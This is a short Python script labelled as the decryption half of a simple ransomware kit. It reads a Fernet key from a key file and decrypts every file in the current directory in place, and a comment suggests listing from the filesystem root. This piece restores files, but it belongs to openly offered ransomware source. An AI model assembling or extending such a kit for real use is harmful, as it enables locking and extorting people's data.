#....Python Ransomware 
#.....Decryption part

import os
from cryptography.fernet import Fernet

#                   Instead of using () use ('/') to list the directory's from root .

files = []

directory = []

for file in os.listdir():
    if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)
    else:
        directory.append(file)

print(files)
print(directory)


with open("thekey.key","rb") as key:
    secrectkey = key.read()

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_decry =Fernet(secrectkey).decrypt(contents)

    with open(file,"wb") as thefile:
        thefile.write(contents_decry)
